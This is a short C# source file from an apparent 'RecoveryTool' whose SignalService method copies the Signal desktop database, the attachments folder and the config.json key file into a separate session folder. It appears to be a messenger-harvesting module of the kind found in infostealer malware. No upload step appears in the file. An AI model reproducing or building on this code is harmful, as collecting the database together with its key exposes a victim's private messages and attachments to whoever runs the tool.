using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class SignalService
    {
        public static async Task SaveSignalAsync()
        {
            string signalFolder = Path.Combine(Common.AppData, "Signal");
            if (!Directory.Exists(signalFolder)) return;

            string signalSession = Common.EnsureSignalPath();

            await MessengerHelper.CopyDirectoryAsync(Path.Combine(signalFolder, "sql"), Path.Combine(signalSession, "sql"));
            await MessengerHelper.CopyDirectoryAsync(Path.Combine(signalFolder, "attachments.noindex"), Path.Combine(signalSession, "attachments.noindex"));
            await MessengerHelper.CopyFilesAsync(signalFolder, signalSession, fi => fi.Name == "config.json");
        }
    }
}